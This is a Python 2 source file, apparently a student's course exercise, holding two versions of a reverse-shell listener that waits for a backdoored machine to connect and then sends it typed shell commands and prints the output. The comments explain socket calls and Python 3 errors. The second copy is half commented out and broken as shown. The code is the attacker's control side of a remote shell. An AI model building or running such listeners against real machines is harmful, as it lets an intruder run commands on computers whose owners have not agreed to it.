#!/usr/bin/env python
#needs debugging to work in python 3 - bytes-like object error issue

import json, socket

class Listener:
    def __init__(self, listen_ip, listen_port): #constructor
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((listen_ip, listen_port))
        listener.listen(0) #specify backlog - number of connections that can be queued before it resets
        print("[+] Listening for incoming connections on " + listen_ip + " port:" + str(listen_port))
        self.connection, address = listener.accept()
        print("[+] Connection established from: " + address[0] + ":" + str(listen_port))
        
    def execute_remotely(self, command, buffer_size):
        self.connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
        return self.connection.recv(buffer_size) #receive result in specified-byte chunks
    
    def reliable_send(self, data):
        #seralise data being sent in order to make sure
        #data arrives intact and pipe doesn't break
        json_data = json.dumps(data) #dumps - method to convert to json object
        self.connection.send(json_data)
    
    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command, buffer_size)
            print(result)
            
            
listen_ip = raw_input("Enter IP Address to listen on: ")
listen_port = int(raw_input("Enter port to listen on: "))
buffer_size = int(raw_input("Enter buffer size (1024 default): "))
#buffer_size - 

my_listener = Listener(listen_ip, listen_port)
my_listener.run()




#================================
#!/usr/bin/env python
#needs debugging to work in python 3 - bytes-like object error issue

#import socket

#listen_ip = raw_input("Enter IP Address to listen on: ")
#listen_port = int(raw_input("Enter port to listen on: "))
#buffer_size = int(raw_input("Enter buffer size (1024 default: "))

#listen_ip = input("Enter IP Address to listen on: ") - python3
#listen_port = int(input("Enter port to listen on: ")) - python3
#buffer_size = int(input("Enter buffer size (1024 default: ")) - python3

#listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) - SOCK_STREAM = TCP connection
#listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#setsockopt = method for setting socket options
#(level, attribute, value)
#this allows reuse of sockets, so they will persist through lost connection

listener.bind((listen_ip, listen_port))
listener.listen(0) #specify backlog - number of connections that can be queued before it resets
print("[+] Listening for incoming connections on " + listen_ip + " port:" + str(listen_port))
#print("[+] Listening for incoming connections on ", listen_ip, "Port:", listen_port) - python3
#listener.accept() - needed to allow connection on the specified IP and port

#listener.accept - the accept method of the socket method returns two values:
connection, address = listener.accept()
#first value - "connection" - socket object representing connection used to send or receive data
#second value - "addresss" - address bound to the connection

print("[+] Connection established from: " + address[0] + ":" + str(listen_port))
#print("[+] Connection established from", address[0], str(listen_port)) - python3

while True:
    command = raw_input(">> ")
    #command = input(">> ") - python3
    connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
    result = connection.recv(buffer_size) #receive result in specified-byte chunks
    print(result)
